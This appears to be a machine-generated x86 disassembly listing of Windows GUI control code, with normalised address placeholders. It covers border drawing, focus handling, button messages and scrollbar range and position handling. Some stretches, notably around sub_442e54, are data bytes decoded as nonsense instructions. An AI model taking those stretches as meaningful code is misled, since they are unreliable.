retn
lea ecx [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
sub_441a1c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_44a650
mov eax ebx
call sub_4491dc
test al al
je r-xdata
cmp [ ebx + 0x276 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45fd40
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_449674
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4491ec
sub_441a94
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_440888
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_4249d8
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_441af0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44d944
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_424af4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_441d19
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_447b68
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4249a4
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_424d84
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_424d84
cmp [ ebx + 0x165 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403368
retn
xor esi esi
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add esi [ ebx + 0x168 ]
test esi esi
jne r-xdata
add esi [ ebx + 0x168 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_448954
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_42516c
push eax
call GetWindowLongA
mov edi eax
test [ ebx + 0x162 ] 0x1
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4249a4
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_424d84
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_424d84
test [ ebx + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x24 ] esi
test [ ebx + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x20 ] esi
test edi 0x200000
je r-xdata
add [ ebp - 0x1c ] esi
test [ ebx + 0x162 ] 0x8
je r-xdata
push 0x14
call GetSystemMetrics
add [ ebp - 0x1c ] eax
test edi 0x100000
je r-xdata
add [ ebp - 0x18 ] esi
xor eax eax
mov al [ ebx + 0x162 ]
xor edx edx
mov dl [ ebx + 0x165 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
xor eax eax
mov al [ ebx + 0x163 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_42516c
push eax
call DrawEdge
push 0xa
call GetSystemMetrics
mov edx [ ebp - 0xc ]
sub edx eax
dec edx
mov [ ebp - 0x14 ] edx
mov eax ebx
call sub_44029c
test al al
je r-xdata
push 0x15
call GetSystemMetrics
add [ ebp - 0x18 ] eax
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_42516c
push eax
call DrawFrameControl
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_42516c
push eax
call DrawFrameControl
jmp r-xdata
sub_441d2c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b4ac
mov eax esi
mov edx [ r-xdata ]
call sub_403518
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_441d50
push ebx
mov ebx eax
mov eax ebx
call sub_45557c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_441d88
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_441dde
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_441dec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44b4e0
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_441e40
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_450284
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_441e94
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_441eb8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_44d1c8
mov eax ebx
mov si 0xffb5
call sub_403564
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_44f7b4
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403564
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_441f30
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43aed8
mov ebx eax
mov eax ebx
call sub_43afb8
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_44f7b4
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43b0b8
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_441f7c
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43aed8
call sub_43afb8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44dc08
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_441fa8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c640
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_441fe0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_441dec
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_448748
mov edx 0x19
mov eax esi
call sub_44876c
mov dl 0x1
mov eax esi
call sub_44f9e8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_44206c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_44fab8
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_44f7b4
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_44f7b4
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_4420c0
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_44fab8
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_45fd40
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_44a180
sub_4420f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441fa8
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44c56c
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_44215c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_44ec30
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_45fc48
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_403564
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403564
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4421c9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_442242
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448fb4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45fcd0
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44ec38
mov eax ebx
mov si 0xffb8
call sub_403564
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403564
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442249
sub_442250
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_44ec40
pop edi
pop esi
pop ebx
retn
sub_4422a4
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43aed8
call sub_43afb8
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_4422d0
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43aed8
mov ebx eax
mov eax ebx
call sub_43afb8
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_44f7b4
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43b0b8
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44231c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_441dec
mov edx 0x71
mov eax esi
call sub_448748
mov edx 0x11
mov eax esi
call sub_44876c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_442384
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403564
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_4423c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_44c4e4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44c4a8
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_455810
sub_442480
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44f9e8
mov eax [ ebp - 0x4 ]
call sub_44fab8
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call SendMessageA
push ebp
call sub_4423c4
pop ecx
mov eax [ ebp - 0x4 ]
call sub_448bc0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403564
sub_44250c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_441fa8
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_44c56c
mov eax ebx
mov si 0xffc8
call sub_403564
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_442563
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5e01173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
pop ebx
retn
sub_442598
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44260d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448fb4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45fcd0
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44ec38
mov eax ebx
mov si 0xffb8
call sub_403564
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442614
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_44261c
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403564
jmp r-xdata
pop esi
retn
sub_44264c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44b4e0
mov edx 0x79
mov eax esi
call sub_448748
push 0x3
call GetSystemMetrics
mov edx eax
mov eax esi
call sub_44876c
mov dl 0x1
mov eax esi
call sub_44f9e8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x208 ] 0x0
xor eax eax
mov [ esi + 0x20c ] eax
xor eax eax
mov [ esi + 0x210 ] eax
mov [ esi + 0x214 ] 0x64
mov [ esi + 0x220 ] 0x1
mov [ esi + 0x222 ] 0x1
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_442704
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_44c640
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_44c56c
xor eax eax
mov al [ ebx + 0x208 ]
mov eax [ eax * 4 + rw-data ]
or [ edi + 0x4 ] eax
cmp [ ebx + 0x208 ] 0x1
jne r-xdata
mov eax ebx
call sub_442844
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_403564
test al al
jne r-xdata
mov [ ebx + 0x21c ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
jmp r-xdata
or [ edi + 0x4 ] 0x2
or [ edi + 0x4 ] 0x4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_442794
call sub_448954
mov eax ebx
call sub_44c76c
lea edx [ esp + 0x1c ]
mov eax ebx
call sub_448974
push 0x0
mov eax [ ebx + 0x214 ]
push eax
mov eax [ ebx + 0x210 ]
push eax
push 0x2
mov eax ebx
call sub_44f7b4
push eax
call SetScrollRange
mov [ esp ] 0x1c
mov eax [ ebx + 0x218 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x4 ] 0x2
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_44f7b4
push eax
call SetScrollInfo
mov eax ebx
call sub_442844
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_44f7b4
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_44f7b4
push eax
call SetScrollPos
jmp r-xdata
add esp 0x2c
pop ebx
retn
sub_442844
push ebx
mov ebx eax
mov eax ebx
call sub_4495f8
test al al
je r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx + 0x208 ] 0x1
je r-xdata
xor eax eax
pop ebx
retn
sub_442864
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] dl
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
call sub_44cd54
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
sub_4428a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4429d7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebp - 0x4 ]
jl r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
cmp esi [ ebx + 0x218 ]
jge r-xdata
cmp esi edi
jge r-xdata
mov edi [ ebp - 0x4 ]
cmp edi [ ebp - 0x4 ]
jge r-xdata
mov eax [ ebx + 0x210 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edi esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x210 ] eax
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_44fab8
test al al
je r-xdata
cmp esi [ ebx + 0x214 ]
je r-xdata
cmp edi [ ebx + 0x20c ]
je r-xdata
cmp edi [ ebx + 0x20c ]
sete al
neg al
sbb eax eax
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_44f7b4
push eax
call SetScrollRange
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4429de
lea eax [ ebp - 0x8 ]
call sub_404164
retn
mov [ ebx + 0x20c ] edi
mov eax ebx
call sub_44fab8
test al al
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
mov si 0xffb3
call sub_403564
mov eax ebx
call sub_442844
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_44f7b4
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_44f7b4
push eax
call SetScrollPos
jmp r-xdata
sub_442a16
add [ eax ] al
mov [ esp ] 0x1c
mov [ esp + 0x10 ] edx
mov [ esp + 0x4 ] 0x2
mov eax ebx
call sub_44fab8
test al al
je r-xdata
add esp 0x1c
pop ebx
retn
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_44f7b4
push eax
call SetScrollInfo
sub_442ac4
push ebx
push esi
push edi
add esp 0xffffffe0
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20c ]
xor eax eax
mov al [ edi + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebx + 0x210 ]
cmp esi eax
jge r-xdata
jmp [ eax * 4 + jump_table_442ae9 ]
mov eax [ ebx + 0x214 ]
cmp esi eax
jle r-xdata
mov esi eax
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
mov [ esp + 0x4 ] 0x1c
mov [ esp + 0x8 ] 0x17
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_44f7b4
push eax
call GetScrollInfo
mov esi [ esp + 0x1c ]
mov eax ebx
call sub_442844
test al al
jne r-xdata
mov esi [ ebx + 0x210 ]
jmp r-xdata
mov esi [ ebx + 0x214 ]
mov [ esp ] esi
mov ecx esp
mov dl [ edi + 0x4 ]
mov eax ebx
mov si 0xffb2
call sub_403564
mov edx [ esp ]
mov eax ebx
call sub_4429e8
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov esi eax
mov eax [ ebx + 0x214 ]
sub eax esi
mov esi eax
jmp r-xdata
sub_442bec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_44f7b4
push eax
mov eax [ ebx + 0x174 ]
push eax
call CallWindowProcA
pop esi
pop ebx
retn
sub_442c1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_442c41
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442c48
retn
sub_442d48
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_455660
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_442d84
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_442da9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442db0
retn
sub_442e54
xor eax 0x3f00442e
inc esp
add [ ecx + 0x2e ] cl
inc esp
add ch ch
sub eax 0x2df50044
inc esp
add ch bh
sub eax 0x2e050044
inc esp
add [ 0x1500442e ] cl
inc esp
add [ 0x2500442e ] bl
inc esp
add [ 0xffffffffcd00442e ] ch
aas
cmp dl [ esi + ebp + 0x44 ]
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
sub eax 0x2dd50044
inc esp
add ch bl
sub eax 0x2de50044
adc eax 0x1d00442e
inc esp
add [ 0x2d00442e ] ah
inc esp
add ch cl
cmp dl [ esi + ebp + 0x44 ]
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc esp
add ch al
sub eax 0x30044
add [ eax ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
in eax 0x2d
cmp dl [ esi + ebp + 0x44 ]
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp ] bh
inc esp
add [ eax + 0x442e ] bl
add [ eax ] al
add [ edi + ebp ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x2f ] dl
inc esp
add [ eax + eax ] ah
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] eax
cwde
xor eax 0x5b840040
inc eax
add [ eax - 0x53ffbfa5 ] dl
xor eax 0x35a00040
inc eax
add [ eax + 0x1c00405b ] ah
xor eax [ eax ]
fdivr [ ecx ]
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
hlt
sub_442f68
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44301d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404164
test edi edi
jne r-xdata
